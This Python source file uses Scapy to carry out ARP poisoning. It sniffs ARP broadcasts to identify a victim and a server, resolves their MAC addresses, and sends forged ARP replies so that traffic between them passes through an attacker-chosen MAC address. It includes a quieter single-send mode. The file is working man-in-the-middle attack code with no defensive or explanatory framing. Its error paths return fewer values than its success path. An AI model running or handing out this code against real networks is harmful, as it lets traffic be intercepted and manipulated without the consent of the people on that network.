import scapy.all as sc;
import time;
import ipaddress;

interface = sc.conf.iface

def get_mac(ip):
    arp = sc.ARP(pdst=ip)
    broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp
    answered = sc.srp(packet, timeout=2, verbose=False, iface=interface)[0]
    for _, received in answered:
        return received.hwsrc
    return None

#do the poisoning
def arp_poisoning(victim_ip, server_ip, mode, spoof_as_mac, logger=None):
    def log(msg):
        if logger:
            logger(msg)
        else:
            print(msg)

    attacker_mac = spoof_as_mac
    victim_mac = None
    server_mac = None

    try:
        # wait for arp broadcast from client
        if victim_ip and not server_ip:
            pkt = sc.sniff(filter="arp", iface=interface, store=1,
                           stop_filter=lambda p: p.haslayer(sc.ARP) and p[sc.ARP].psrc == victim_ip)[0]
            server_ip = pkt[sc.ARP].pdst
            victim_mac = get_mac(victim_ip)
            server_mac = get_mac(server_ip)

        # wait for any arp broadcast
        elif not victim_ip and not server_ip:
            log("Waiting for any ARP broadcast to discover both IPs...")
            pkt = sc.sniff(filter="arp", iface=interface, store=1,
                           stop_filter=lambda p: p.haslayer(sc.ARP) and p[sc.ARP].op == 1)[0]
            victim_ip = pkt[sc.ARP].psrc
            server_ip = pkt[sc.ARP].pdst
            victim_mac = get_mac(victim_ip)
            server_mac = get_mac(server_ip)

        #get mac addresses from given IP's
        else:
            victim_mac = get_mac(victim_ip)
            server_mac = get_mac(server_ip)
            log("Waiting for ARP broadcast from victim")
            pkt = sc.sniff(filter="arp", iface=interface, store=1,
                           stop_filter=lambda p: p.haslayer(sc.ARP) and p[sc.ARP].psrc == victim_ip and p[sc.ARP].pdst == server_ip)[0]

        if not victim_mac or not server_mac:
            log("Could not resolve MAC addresses.")
            return None, None

        # create the fake responses
        fake_packet_victim = sc.Ether(dst=victim_mac) / sc.ARP(
            op=2, pdst=victim_ip, hwdst=victim_mac, psrc=server_ip, hwsrc=attacker_mac)
        fake_packet_server = sc.ARP(op=2, pdst=server_ip, psrc=victim_ip, hwsrc=attacker_mac)

        #send the responses
        if mode == "silent":
            sc.sendp(fake_packet_victim, iface=interface, verbose=False)
        else:
            for i in range(5):
                sc.sendp(fake_packet_victim, iface=interface, verbose=False)
                time.sleep(0.5)
        sc.send(fake_packet_server, iface=interface, verbose=False)
        return server_mac, victim_mac, server_ip, victim_ip

    except Exception as e:
        log(f"Error during ARP poisoning: {e}")
        return None, None
    
